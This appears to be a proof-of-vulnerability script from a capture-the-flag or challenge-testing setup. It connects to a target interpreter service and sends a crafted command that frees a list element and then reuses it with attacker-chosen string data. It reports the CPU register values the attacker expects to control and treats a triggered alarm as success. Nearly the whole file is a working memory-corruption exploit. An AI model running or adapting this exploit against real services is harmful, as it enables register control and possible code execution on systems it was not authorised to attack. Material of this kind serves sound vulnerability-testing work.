import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[SUCCESS] sigalrm fired so the POV was likely successful')
    exit(0)

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = b''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1)
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, b'\n')

def SW(s, data):
    #print data
    s.sendall(data)

def RB(s):
    return RU(s, b'>>> ')

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)
    
    s = connect( HOST, PORT )

    RB(s)

    cmd = b'list a = [1,2,4]; int i = getbyindex(a,0); erase(a, 0); string s = "bbbbbbbbccccccccddddddddeeeeeeeeffffffffggggggggstrnaa"; i = "zzzzzzzz";'

    SW(s, cmd + b'\n')

    print('RCX=0x7a7a7a7a7a7a7a7a')
    print('RDI=0x6464646464646464')

    RB(s);

    print('[FAIL] POV failed')

if __name__ == '__main__':
    main()
